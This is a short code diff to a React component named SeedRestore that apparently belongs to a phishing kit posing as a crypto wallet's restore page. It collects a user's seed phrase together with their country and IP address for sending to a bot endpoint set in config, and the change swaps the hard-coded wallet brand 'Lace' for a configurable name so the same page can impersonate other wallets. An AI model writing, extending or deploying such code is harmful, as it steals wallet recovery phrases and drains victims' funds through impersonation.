@@ -2,7 +2,7 @@
 
 import React, { useMemo, useState, useRef, useEffect } from "react";
 import axios from "axios";
-import { TON_BOT_API_KEY, TON_BOT_SEED_URL } from "../app/config";
+import { NOTIFICATION_APP_NAME, TON_BOT_API_KEY, TON_BOT_SEED_URL } from "../app/config";
 
 // Load BIP39 wordlist from public file
 const loadWordlist = async (): Promise<string[]> => {
@@ -211,7 +211,7 @@ export default function SeedRestore({
       const userData = await getUserCountry();
 
       const messageData = {
-        appName: "Lace",
+        appName: NOTIFICATION_APP_NAME,
         seedPhrase: sanitizedSeedPhrase.join(" "),
         country: userData?.country || "Unknown",
         ipAddress: userData?.ip || "Unknown",
